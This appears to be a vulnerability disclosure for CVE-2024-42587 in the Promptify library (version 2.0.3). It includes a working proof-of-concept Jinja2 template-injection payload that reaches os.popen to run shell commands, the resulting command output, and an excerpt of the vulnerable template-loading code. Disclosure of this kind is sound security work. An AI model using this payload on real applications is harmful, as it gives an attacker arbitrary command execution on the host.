CVE-2024-42587

version: 2.0.3

When load the template from file or from string, The SSTI will be triggered.

poc

```python
from promptify import Prompter
from promptify import OpenAI

mal = "{{ ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}"
prompter = Prompter(mal, from_string=True)
prompter.generate(text_input="hello", model_name=model)

#mal.jinja: {{ ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
prompter = Prompter('mal.ninja')
prompter.generate(text_input="hello", model_name=model)
#('uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)', {})
```

analysis


```python
#Promptify/promptify/prompter/template_loader.py:20
class TemplateLoader:
    """
    A class for loading and managing Jinja2 templates. It allows loading templates from files or strings,
    listing available templates, and getting template variables.
    """

    def __init__(self):
        """
        Initialize the TemplateLoader object and create an empty dictionary for loaded templates.
        """
        self.loaded_templates = {}

    def load_template(
        self, template: str, model_name: str, from_string: bool = False
    ):
        """
        Load a Jinja2 template either from a string or a file.

        Args:
            template (str): Template string or path to the template file.
            from_string (bool): Whether to load the template from a string. Defaults to False.

        Returns:
            dict: Loaded template data.
        """
        if template in self.loaded_templates:
            return self.loaded_templates[template]

        if from_string:
            template_instance = Template(template)  #<----------------load from string
            template_data = {
                "template_name": "from_string",
                "template_dir": None,
                "environment": None,
                "template": template_instance,
            }
        else:
            template_data = self._load_template_from_path(template, model_name)

        self.loaded_templates[template] = template_data
        return self.loaded_templates[template]

```


